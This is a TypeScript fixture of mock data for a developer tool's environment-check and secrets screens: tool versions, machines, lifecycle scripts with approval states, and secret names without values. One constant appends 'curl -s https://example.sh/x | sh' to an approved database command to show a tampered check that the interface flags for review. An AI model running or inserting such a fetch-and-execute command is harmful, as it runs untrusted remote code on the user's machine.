import type { CapabilityResult, EnvironmentCheckDefinition, EnvironmentMachine, EnvironmentViewModel, LifecycleScript, SecretsPageViewModel, TrustState } from './types.js';

const approvedDbCommand = 'bun run db:status';
const changedDbCommand = 'bun run db:status && curl -s https://example.sh/x | sh';

const approvedTrust = (commandHash: string, approvedAt: string): TrustState => ({
  status: 'approved',
  approvedBy: 'Studio browser',
  approvedAt,
  commandHash,
});

const catalogChecks: Record<string, EnvironmentCheckDefinition> = {
  bun: { id: 'bun', label: 'Bun', source: 'catalog', requirement: '>= 1.3', version: '1.3.1', url: 'https://bun.sh' },
  git: { id: 'git', label: 'Git', source: 'catalog', version: '2.51.0' },
  gh: { id: 'gh', label: 'GitHub CLI', source: 'catalog', version: '2.78.0' },
  wrangler: { id: 'wrangler', label: 'Wrangler', source: 'catalog', version: '4.31.0', probe: 'wrangler whoami', fix: 'wrangler login' },
  cloudflared: { id: 'cloudflared', label: 'Cloudflared', source: 'catalog', version: '2026.8.1' },
  docker: { id: 'docker', label: 'Docker', source: 'catalog', version: '28.3.3', probe: 'docker info', fix: 'Start Docker Desktop or the Docker daemon.' },
  xcode: { id: 'xcode', label: 'Xcode', source: 'catalog', version: '16.4', probe: 'xcodebuild -version', platform: 'darwin' },
  fastlane: { id: 'fastlane', label: 'Fastlane', source: 'catalog', version: '2.228.0', platform: 'darwin' },
};

export const changedCheckTrust: Extract<TrustState, { status: 'changed' }> = {
  status: 'changed',
  commandHash: 'sha256:3d8972d1',
  approvedCommand: approvedDbCommand,
  currentCommand: changedDbCommand,
  approvedBy: 'Studio browser',
  approvedAt: 'Aug 29, 2026',
};

const checks: Record<string, EnvironmentCheckDefinition> = {
  ...catalogChecks,
  'db-migrated': {
    id: 'db-migrated',
    label: 'Database migrated',
    source: 'custom',
    probe: changedDbCommand,
    fix: 'Review the changed command before running it.',
    trust: changedCheckTrust,
  },
};

const pass = (output: string): CapabilityResult => ({ status: 'pass', output });
const unprobed: CapabilityResult = { status: 'unprobed' };

const localCapabilities: Record<string, CapabilityResult> = {
  bun: pass('bun 1.3.1'),
  git: pass('git 2.51.0'),
  gh: pass('gh 2.78.0 · logged in'),
  wrangler: { status: 'fail', output: 'not logged in', fix: 'wrangler login' },
  cloudflared: pass('cloudflared 2026.8.1'),
  docker: pass('Docker Engine 28.3.3 · daemon ready'),
  'db-migrated': pass('schema at migration 0006'),
  xcode: unprobed,
  fastlane: unprobed,
};

const studioCapabilities: Record<string, CapabilityResult> = {
  bun: pass('bun 1.3.1'),
  git: pass('git 2.51.0'),
  gh: pass('gh 2.78.0 · logged in'),
  wrangler: pass('wrangler 4.31.0 · bradleat'),
  cloudflared: pass('cloudflared 2026.8.1'),
  docker: pass('Docker Desktop 4.45.0'),
  'db-migrated': pass('schema at migration 0006'),
  xcode: pass('Xcode 16.4 · Build 16F6'),
  fastlane: pass('fastlane 2.228.0'),
};

const sandboxCapabilities: Record<string, CapabilityResult> = Object.fromEntries(Object.keys(checks).map((id) => [id, unprobed]));

export const environmentMachines: readonly EnvironmentMachine[] = [
  { id: 'local-machine', label: 'local-machine', platform: 'linux', current: true, capabilities: localCapabilities },
  { id: 'studio', label: 'Studio', platform: 'darwin', current: false, capabilities: studioCapabilities },
  { id: 'sandbox-3', label: 'sandbox-3', platform: 'linux', current: false, capabilities: sandboxCapabilities },
];

export const lifecycleScripts: readonly LifecycleScript[] = [
  {
    id: 'setup/10-install.sh',
    phase: 'setup',
    path: 'setup/10-install.sh',
    command: '.gitspace/lifecycle/setup/10-install.sh',
    trust: approvedTrust('sha256:2f67b911', 'Aug 28, 2026'),
    lastRun: { status: 'succeeded', relativeTime: '2h ago', duration: '42s', output: 'Dependencies installed.' },
  },
  {
    id: 'setup/20-db.sh',
    phase: 'setup',
    path: 'setup/20-db.sh',
    command: '.gitspace/lifecycle/setup/20-db.sh --migrate-and-seed',
    trust: {
      status: 'changed',
      commandHash: 'sha256:be81bbca',
      approvedCommand: '.gitspace/lifecycle/setup/20-db.sh --migrate',
      currentCommand: '.gitspace/lifecycle/setup/20-db.sh --migrate-and-seed',
      approvedBy: 'Studio browser',
      approvedAt: 'Aug 28, 2026',
    },
    lastRun: { status: 'failed', relativeTime: '3h ago', duration: '18s', output: 'migration 0006 failed' },
  },
  {
    id: 'setup/30-xcode.ios.sh',
    phase: 'setup',
    path: 'setup/30-xcode.ios.sh',
    command: '.gitspace/lifecycle/setup/30-xcode.ios.sh',
    profiles: ['ios'],
    trust: approvedTrust('sha256:5611fb20', 'Aug 28, 2026'),
    lastRun: { status: 'never' },
  },
  {
    id: 'select/env.sh',
    phase: 'select',
    path: 'select/env.sh',
    command: '.gitspace/lifecycle/select/env.sh',
    trust: approvedTrust('sha256:8aa351cc', 'Aug 28, 2026'),
    lastRun: { status: 'succeeded', relativeTime: 'just now', duration: '0.4s', output: 'Workspace environment selected.' },
  },
  {
    id: 'remove/drop-preview.sh',
    phase: 'remove',
    path: 'remove/drop-preview.sh',
    command: '.gitspace/lifecycle/remove/drop-preview.sh',
    trust: { status: 'pending', commandHash: 'sha256:607cda30' },
    lastRun: { status: 'never' },
  },
];

export const environmentFixture: EnvironmentViewModel = {
  project: { name: 'GitSpace', repository: 'gitspace.sh' },
  workspace: { name: 'agent-blame', profile: 'backend', machineId: 'local-machine' },
  bundle: {
    default: 'backend',
    profiles: {
      base: {
        checks: ['bun', 'git', 'gh'],
        secrets: ['ANTHROPIC_API_KEY'],
        inputs: ['region'],
        notes: 'Shared requirements run in every workspace.',
      },
      backend: {
        checks: ['wrangler', 'cloudflared', 'docker', 'db-migrated'],
        secrets: ['CLOUDFLARE_API_TOKEN'],
        inputs: [],
        notes: 'Needs ~8GB RAM. Postgres runs in docker.',
      },
      ios: {
        checks: ['xcode', 'fastlane'],
        secrets: ['APPLE_TEAM_ID'],
        inputs: [],
        notes: 'macOS with Xcode 16 and an Apple signing identity.',
      },
    },
    checks,
    inputs: {
      region: { default: 'us-east-1', choices: ['us-east-1', 'us-west-2', 'eu-west-1'], description: 'Cloud region used by preview infrastructure.' },
    },
  },
  machines: environmentMachines,
  lifecycle: lifecycleScripts,
  secrets: [
    { name: 'CLOUDFLARE_API_TOKEN', source: 'user', granted: true, requiredBy: ['backend', 'ios'] },
    { name: 'ANTHROPIC_API_KEY', source: 'project', granted: true, requiredBy: ['backend', 'ios'] },
    { name: 'APPLE_TEAM_ID', source: 'user', granted: false, requiredBy: ['ios'] },
  ],
  inputValues: [{ name: 'region', value: 'us-east-1', source: 'project' }],
};

export const secretsPageFixture: SecretsPageViewModel = {
  projects: ['GitSpace', 'Website'],
  selectedProject: 'GitSpace',
  userSecrets: [
    { name: 'CLOUDFLARE_API_TOKEN', updated: '2 days ago', projects: ['GitSpace', 'Website'] },
    { name: 'VERCEL_TOKEN', updated: 'Aug 18, 2026', projects: ['Website'], unused: true },
  ],
  projectSecrets: [
    { name: 'ANTHROPIC_API_KEY', updated: '3 hours ago', project: 'GitSpace', requiredBy: ['backend', 'ios'] },
  ],
  projectValues: [
    { name: 'REGION', value: 'us-east-1', updated: 'Aug 24, 2026', project: 'GitSpace', requiredBy: ['backend', 'ios'] },
    { name: 'LOG_LEVEL', value: 'info', updated: 'Aug 20, 2026', project: 'GitSpace', requiredBy: ['backend'] },
    { name: 'DEPLOY_CHANNEL', value: 'preview', updated: 'Aug 18, 2026', project: 'Website', requiredBy: ['frontend'] },
  ],
  missing: [
    { name: 'APPLE_TEAM_ID', source: 'user', granted: false, requiredBy: ['ios'] },
    { name: 'SENTRY_AUTH_TOKEN', source: 'user', granted: false, requiredBy: ['backend', 'ios'] },
    { name: 'DATABASE_URL', source: 'project', granted: false, requiredBy: ['backend'] },
  ],
};
